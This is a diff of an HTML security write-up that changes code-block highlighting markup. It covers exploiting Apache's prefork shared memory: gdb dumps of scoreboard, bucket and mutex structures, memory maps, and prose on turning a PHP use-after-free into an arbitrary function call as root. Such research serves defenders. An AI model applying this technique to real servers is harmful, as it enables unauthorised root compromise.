-  &lt;span class="n"&gt;suspended&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
-  &lt;span class="n"&gt;bucket&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt; &lt;span class="n"&gt;for&lt;/span&gt; &lt;span class="n"&gt;all_buckets&lt;/span&gt;
-&lt;span class="p"&gt;}&lt;/span&gt;
-&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;ptype&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;ap_scoreboard_image&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;parent&lt;/span&gt;
-&lt;span class="n"&gt;type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;process_score&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-    &lt;span class="n"&gt;pid_t&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="n"&gt;ap_generation_t&lt;/span&gt; &lt;span class="n"&gt;generation&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="n"&gt;char&lt;/span&gt; &lt;span class="n"&gt;quiescing&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="n"&gt;char&lt;/span&gt; &lt;span class="n"&gt;not_accepting&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="n"&gt;apr_uint32_t&lt;/span&gt; &lt;span class="n"&gt;connections&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="n"&gt;apr_uint32_t&lt;/span&gt; &lt;span class="n"&gt;write_completion&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="n"&gt;apr_uint32_t&lt;/span&gt; &lt;span class="n"&gt;lingering_close&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="n"&gt;apr_uint32_t&lt;/span&gt; &lt;span class="n"&gt;keep_alive&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="n"&gt;apr_uint32_t&lt;/span&gt; &lt;span class="n"&gt;suspended&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
-    &lt;span class="n"&gt;int&lt;/span&gt; &lt;span class="n"&gt;bucket&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="n"&gt;index&lt;/span&gt; &lt;span class="n"&gt;for&lt;/span&gt; &lt;span class="n"&gt;all_buckets&lt;/span&gt;
-&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;gdb&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;p&lt;/span&gt; &lt;span class="nv"&gt;ap_scoreboard_image&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="nv"&gt;parent&lt;/span&gt;[&lt;span class="mi"&gt;0&lt;/span&gt;]
+&lt;span class="mh"&gt;$6&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; {
+  &lt;span class="nv"&gt;pid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;19447&lt;/span&gt;, 
+  &lt;span class="nv"&gt;generation&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;, 
+  &lt;span class="nv"&gt;quiescing&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="s"&gt;\000&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;, 
+  &lt;span class="nv"&gt;not_accepting&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="s"&gt;\000&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;, 
+  &lt;span class="nv"&gt;connections&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;, 
+  &lt;span class="nv"&gt;write_completion&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;, 
+  &lt;span class="nv"&gt;lingering_close&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;, 
+  &lt;span class="nv"&gt;keep_alive&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;, 
+  &lt;span class="nv"&gt;suspended&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;, 
+  &lt;span class="nv"&gt;bucket&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="nv"&gt;index&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nv"&gt;all_buckets&lt;/span&gt;
+}
+&lt;span class="ss"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;gdb&lt;/span&gt;&lt;span class="ss"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;ptype&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="nv"&gt;ap_scoreboard_image&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="nv"&gt;parent&lt;/span&gt;
+&lt;span class="nv"&gt;type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;struct&lt;/span&gt; &lt;span class="nv"&gt;process_score&lt;/span&gt; {
+    &lt;span class="nv"&gt;pid_t&lt;/span&gt; &lt;span class="nv"&gt;pid&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;ap_generation_t&lt;/span&gt; &lt;span class="nv"&gt;generation&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;char&lt;/span&gt; &lt;span class="nv"&gt;quiescing&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;char&lt;/span&gt; &lt;span class="nv"&gt;not_accepting&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;apr_uint32_t&lt;/span&gt; &lt;span class="nv"&gt;connections&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;apr_uint32_t&lt;/span&gt; &lt;span class="nv"&gt;write_completion&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;apr_uint32_t&lt;/span&gt; &lt;span class="nv"&gt;lingering_close&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;apr_uint32_t&lt;/span&gt; &lt;span class="nv"&gt;keep_alive&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;apr_uint32_t&lt;/span&gt; &lt;span class="nv"&gt;suspended&lt;/span&gt;&lt;span class="c1"&gt;;&lt;/span&gt;
+    &lt;span class="nv"&gt;int&lt;/span&gt; &lt;span class="nv"&gt;bucket&lt;/span&gt;&lt;span class="c1"&gt;; &amp;lt;- index for all_buckets&lt;/span&gt;
+}
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;When Apache gracefully restarts, its main process kills old workers and replaces them by new ones.
 At this point, every old worker's &lt;code&gt;bucket&lt;/code&gt; value will be used by the main process to access an array of his, &lt;code&gt;all_buckets&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;em&gt;all_buckets&lt;/em&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(gdb) p $index = ap_scoreboard_image-&amp;gt;parent[0]-&amp;gt;bucket
-(gdb) p all_buckets[$index]
-$7 = {
-  pod = 0x7f19db2c7408, 
-  listeners = 0x7f19db35e9d0, 
-  mutex = 0x7f19db2c7550
-}
-(gdb) ptype all_buckets[$index]
-type = struct prefork_child_bucket {
-    ap_pod_t *pod;
-    ap_listen_rec *listeners;
-    apr_proc_mutex_t *mutex; &amp;lt;--
-}
-(gdb) ptype apr_proc_mutex_t
-apr_proc_mutex_t {
-    apr_pool_t *pool;
-    const apr_proc_mutex_unix_lock_methods_t *meth; &amp;lt;--
-    int curr_locked;
-    char *fname;
-    ...
-}
-(gdb) ptype apr_proc_mutex_unix_lock_methods_t
-apr_proc_mutex_unix_lock_methods_t {
-    ...
-    apr_status_t (*child_init)(apr_proc_mutex_t **, apr_pool_t *, const char *); &amp;lt;--
-    ...
-}
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="k"&gt;index&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ap_scoreboard_image&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;parent&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;bucket&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="n"&gt;all_buckets&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="k"&gt;index&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;
+  &lt;span class="n"&gt;pod&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x7f19db2c7408&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
+  &lt;span class="n"&gt;listeners&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x7f19db35e9d0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
+  &lt;span class="n"&gt;mutex&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;x7f19db2c7550&lt;/span&gt;
+&lt;span class="err"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;ptype&lt;/span&gt; &lt;span class="n"&gt;all_buckets&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="k"&gt;index&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="k"&gt;type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;prefork_child_bucket&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;ap_pod_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;pod&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="n"&gt;ap_listen_rec&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;listeners&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="n"&gt;apr_proc_mutex_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;mutex&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+&lt;span class="err"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;ptype&lt;/span&gt; &lt;span class="n"&gt;apr_proc_mutex_t&lt;/span&gt;
+&lt;span class="n"&gt;apr_proc_mutex_t&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;apr_pool_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;pool&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="n"&gt;const&lt;/span&gt; &lt;span class="n"&gt;apr_proc_mutex_unix_lock_methods_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;meth&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+    &lt;span class="nb"&gt;int&lt;/span&gt; &lt;span class="n"&gt;curr_locked&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nb"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;fname&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="p"&gt;...&lt;/span&gt;
+&lt;span class="err"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;ptype&lt;/span&gt; &lt;span class="n"&gt;apr_proc_mutex_unix_lock_methods_t&lt;/span&gt;
+&lt;span class="n"&gt;apr_proc_mutex_unix_lock_methods_t&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;
+    &lt;span class="p"&gt;...&lt;/span&gt;
+    &lt;span class="n"&gt;apr_status_t&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;child_init&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;apr_proc_mutex_t&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;apr_pool_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;const&lt;/span&gt; &lt;span class="nb"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="c1"&gt;--&lt;/span&gt;
+    &lt;span class="p"&gt;...&lt;/span&gt;
+&lt;span class="err"&gt;}&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -155,29 +327,29 @@ This results in an &lt;strong&gt;arbitrary function call as root&lt;/strong&gt;.
 - Edit the SHM to change &lt;code&gt;bucket&lt;/code&gt; index and add our custom mutex structure&lt;/p&gt;
 &lt;p&gt;Luckily for us, PHP's heap is located before those two in memory.&lt;/p&gt;
 &lt;p&gt;&lt;em&gt;Memory addresses of PHP's heap, &lt;code&gt;ap_scoreboard_image-&amp;gt;*&lt;/code&gt; and &lt;code&gt;all_buckets&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@apaubuntu:~# cat /proc/6318/maps | grep libphp | grep rw-p
-7f4a8f9f3000-7f4a8fa0a000 rw-p 00471000 08:02 542265 /usr/lib/apache2/modules/libphp7.2.so
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="nv"&gt;@apaubuntu&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cat&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;proc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;6318&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;maps&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;grep&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;libphp&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;grep&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="n"&gt;f4a8f9f3000&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="n"&gt;f4a8fa0a000&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;00471000&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;02&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;542265&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lib&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;apache2&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;modules&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;libphp7&lt;/span&gt;&lt;span class="mf"&gt;.2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;so&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
 
-(gdb) p *ap_scoreboard_image 
-$14 = {
-  global = 0x7f4a9323e008, 
-  parent = 0x7f4a9323e020, 
-  servers = 0x55835eddea78
-}
-(gdb) p all_buckets 
-$15 = (prefork_child_bucket *) 0x7f4a9336b3f0
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;ap_scoreboard_image&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;
+&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="k"&gt;global&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x7f4a9323e008&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;parent&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x7f4a9323e020&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;servers&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x55835eddea78&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="err"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;all_buckets&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;
+&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;prefork_child_bucket&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x7f4a9336b3f0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Since we're triggering the UAF on a PHP object, any property of this object will be UAF'd too; we can convert this &lt;code&gt;zend_object&lt;/code&gt; UAF into a &lt;code&gt;zend_string&lt;/code&gt; one.
 This is useful because of &lt;code&gt;zend_string&lt;/code&gt;'s structure:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(gdb) ptype zend_string
-type = struct _zend_string {
-    zend_refcounted_h gc;
-    zend_ulong h;
-    size_t len;
-    char val[1];
-}
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gdb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;ptype&lt;/span&gt; &lt;span class="n"&gt;zend_string&lt;/span&gt;
+&lt;span class="k"&gt;type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;_zend_string&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;
+    &lt;span class="n"&gt;zend_refcounted_h&lt;/span&gt; &lt;span class="n"&gt;gc&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="n"&gt;zend_ulong&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="n"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="nb"&gt;char&lt;/span&gt; &lt;span class="n"&gt;val&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+&lt;span class="err"&gt;}&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -185,45 +357,45 @@ type = struct _zend_string {
 &lt;h3&gt;Locating &lt;code&gt;bucket&lt;/code&gt; indexes and &lt;code&gt;all_buckets&lt;/code&gt;&lt;/h3&gt;
 &lt;p&gt;We want to change &lt;code&gt;ap_scoreboard_image-&amp;gt;parent[worker_id]-&amp;gt;bucket&lt;/code&gt; for a certain &lt;code&gt;worker_id&lt;/code&gt;. Luckily, the structure always starts at the beginning of the shared memory block, so it is easy to locate.&lt;/p&gt;
 &lt;p&gt;&lt;em&gt;Shared memory location and targeted process_score structures&lt;/em&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@apaubuntu:~# cat /proc/6318/maps | grep rw-s
-7f4a9323e000-7f4a93252000 rw-s 00000000 00:05 57052                      /dev/zero (deleted)
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="nv"&gt;@apaubuntu&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cat&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;proc&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;6318&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;maps&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;grep&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="n"&gt;f4a9323e000&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="n"&gt;f4a93252000&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;00000000&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;00&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;05&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;57052&lt;/span&gt;&lt;span class="w"&gt;                      &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;dev&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;zero&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;deleted&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
 
-(gdb) p &amp;amp;ap_scoreboard_image-&amp;gt;parent[0]
-$18 = (process_score *) 0x7f4a9323e020
-(gdb) p &amp;amp;ap_scoreboard_image-&amp;gt;parent[1]
-$19 = (process_score *) 0x7f4a9323e044
